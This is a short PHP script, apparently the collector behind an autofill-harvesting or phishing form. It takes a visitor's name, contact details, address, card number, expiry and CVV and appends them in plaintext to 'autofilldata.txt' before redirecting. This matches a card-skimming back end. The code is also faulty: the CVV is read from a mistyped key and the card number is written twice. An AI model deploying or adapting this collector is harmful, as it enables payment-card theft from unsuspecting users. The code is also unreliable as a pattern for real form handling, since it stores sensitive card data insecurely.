<?php
	$name = $_POST['name'];
	$email = $_POST['email'];
	$phone = $_POST['phone'];
	$organization = $_POST['organization'];
	$address = $_POST['address'];
	$postal = $_POST['postal'];
	$city = $_POST['city'];
	$country = $_POST['country'];
	$cc_number = $_POST['cc_number'];
	$cc_month = $_POST['cc_month'];
	$cc_year = $_POST['cc_year'];
	$cc_cvv = $_POST['$cc_cvv'];
	$fp = fopen ("autofilldata.txt", "a");
	$savestring = $name . "," . $email . "," . $phone . ",". $organization . "," . $address . "," . $postal . "," . $city . "," . $country . "," .
	"," . $cc_number . "," . $cc_year . "," . $cc_month . "," . $cc_number . ",". $cc_cvv . "," ."\n";
	fwrite ($fp, $savestring);
	fclose($fp);

header("Location: index2.php");
?>
